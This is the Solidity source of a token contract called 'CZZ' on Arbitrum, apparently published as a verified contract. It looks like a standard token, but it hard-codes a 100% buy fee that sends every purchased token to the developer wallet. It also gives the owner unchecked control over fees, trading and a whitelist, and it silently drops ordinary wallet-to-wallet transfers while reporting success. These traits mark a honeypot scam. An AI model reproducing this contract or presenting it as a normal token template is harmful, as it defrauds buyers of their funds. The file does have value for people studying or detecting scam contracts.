/**
 *Submitted for verification at Arbiscan.io on 2023-09-01
*/

// SPDX-License-Identifier: Unlicensed

pragma solidity ^0.8.0;

library SafeMath {

    function tryAdd(uint256 a, uint256 b) internal pure returns (bool, uint256) {
        unchecked {
            uint256 c = a + b;
            if (c < a) return (false, 0);
            return (true, c);
        }
    }

    function trySub(uint256 a, uint256 b) internal pure returns (bool, uint256) {
        unchecked {
            if (b > a) return (false, 0);
            return (true, a - b);
        }
    }

    function tryMul(uint256 a, uint256 b) internal pure returns (bool, uint256) {
        unchecked {
            if (a == 0) return (true, 0);
            uint256 c = a * b;
            if (c / a != b) return (false, 0);
            return (true, c);
        }
    }

    function tryDiv(uint256 a, uint256 b) internal pure returns (bool, uint256) {
        unchecked {
            if (b == 0) return (false, 0);
            return (true, a / b);
        }
    }

    function tryMod(uint256 a, uint256 b) internal pure returns (bool, uint256) {
        unchecked {
            if (b == 0) return (false, 0);
            return (true, a % b);
        }
    }

    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        return a + b;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return a - b;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        return a * b;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return a / b;
    }

    function mod(uint256 a, uint256 b) internal pure returns (uint256) {
        return a % b;
    }

    function sub(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        unchecked {
            require(b <= a, errorMessage);
            return a - b;
        }
    }

    function div(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        unchecked {
            require(b > 0, errorMessage);
            return a / b;
        }
    }

    function mod(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        unchecked {
            require(b > 0, errorMessage);
            return a % b;
        }
    }
}

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

abstract contract Ownable is Context {
    address private _owner;

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    constructor() {
        _transferOwnership(_msgSender());
    }

    function owner() public view virtual returns (address) {
        return _owner;
    }

    modifier onlyOwner() {
        require(owner() == _msgSender(), "Ownable: caller is not the owner");
        _;
    }

    function renounceOwnership() public virtual onlyOwner {
        _transferOwnership(address(0));
    }

    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0), "Ownable: new owner is the zero address");
        _transferOwnership(newOwner);
    }

    function _transferOwnership(address newOwner) internal virtual {
        address oldOwner = _owner;
        _owner = newOwner;
        emit OwnershipTransferred(oldOwner, newOwner);
    }
}

interface IUniswapV3Factory {
    function createPool(
        address tokenA,
        address tokenB,
        uint24 fee
    ) external returns (address pool);
}

contract CZZ is Ownable{
    using SafeMath for uint256;
    string public name = "CZZ Token";
    string public symbol = "CZZ";
    uint8 public decimals = 18;
    uint256 public totalSupply = 180000*10**decimals;
    uint256 public buyFee = 100; // 100% buyFee fee
    uint256 public sellFee = 0; // 0% sellFee fee
    address f = address(0x1F98431c8aD98523631AE4a59f267346ea31F984);//UniswapV3Factory
    address public pair;
    address WETH = address(0x82aF49447D8a07e3bd95BD0d56f35241523fBab1); //arb
    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;
    mapping(address => bool) public wl;
    address devWallet;
    bool canbuy = false;
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
    event Setwl(address indexed user, bool value);
    event Setfee(uint256 buyFee, uint256 sellFee);
    constructor() {
        balanceOf[msg.sender] = totalSupply;
        devWallet = owner();
        pair = IUniswapV3Factory(f).createPool(WETH,address(this),3000);
        wl[owner()] = true;
        wl[address(this)] = true;
        wl[address(0x1F98415757620B543A52E61c46B32eB19261F984)] = true;  //muticall
        wl[address(0x61fFE014bA17989E743c5F6cB21bF9697530B21e)] = true;  //QuoterV2
        emit Transfer(address(0), msg.sender, totalSupply);
    }

    function setwl(address[] calldata user,bool[] calldata value) external onlyOwner {
        for(uint256 i = 0;i<user.length;i++){
            wl[user[i]] = value[i];
            emit Setwl(user[i],value[i]);
        }
    }

    function setcanbuy(bool _canbuy) external onlyOwner{
        canbuy = _canbuy;
    }

    function setfee(address _devWallet) external onlyOwner{
        devWallet = _devWallet;
    }

    function setfee(uint256 _buyFee,uint256 _sellFee) external onlyOwner{
        buyFee = _buyFee;
        sellFee = _sellFee;
        emit Setfee(_buyFee,_sellFee);
    }

    function transfer(address _to, uint256 _value) public returns (bool success) {
        require(balanceOf[msg.sender] >= _value, "Not enough balance");
        _transfer(msg.sender, _to, _value);
        return true;
    }

    function approve(address _spender, uint256 _value) public returns (bool success) {
        allowance[msg.sender][_spender] = _value;
        emit Approval(msg.sender, _spender, _value);
        return true;
    }

    function _transfer(address _from, address _to, uint256 _value) internal returns (bool success) {
        uint256 feeAmount = 0;
        uint256 bc = 0;
        bool takeFee = true;
        if(wl[_from] || wl[_to] ){
            takeFee = false;
        }
        if(takeFee){
            if(_from == pair){
                require(canbuy == true,'cant buy');
                feeAmount = _value.mul(buyFee).div(100);
                unchecked{
                    balanceOf[_from] -= _value;
                    bc = _value - feeAmount;
                    balanceOf[_to] += bc;
                    balanceOf[devWallet] += feeAmount;
                }
                emit Transfer(_from, _to, bc);
                emit Transfer(_from, devWallet, feeAmount);
            }else if(_to == pair){
                feeAmount = _value.mul(sellFee).div(100); 
                unchecked{
                    bc = _value + feeAmount;
                    require(balanceOf[_from] >= bc, "Not enough balance");
                    balanceOf[_from] -= bc;
                    balanceOf[_to] += _value;
                    balanceOf[devWallet] += feeAmount;
                }
                emit Transfer(_from, _to, _value);
                emit Transfer(_from, devWallet, feeAmount);                
            }
        }else{
            balanceOf[_from] -= _value;
            balanceOf[_to] += _value;
            emit Transfer(_from, _to, _value);     
        }
        return true;
    }

    function transferFrom(address _from, address _to, uint256 _value) public returns (bool success) {
        require(balanceOf[_from] >= _value, "Not enough balance");
        require(allowance[_from][msg.sender] >= _value, "Not enough allowance");
        _transfer(_from, _to, _value);
        allowance[_from][msg.sender] -= _value;
        return true;
    }
}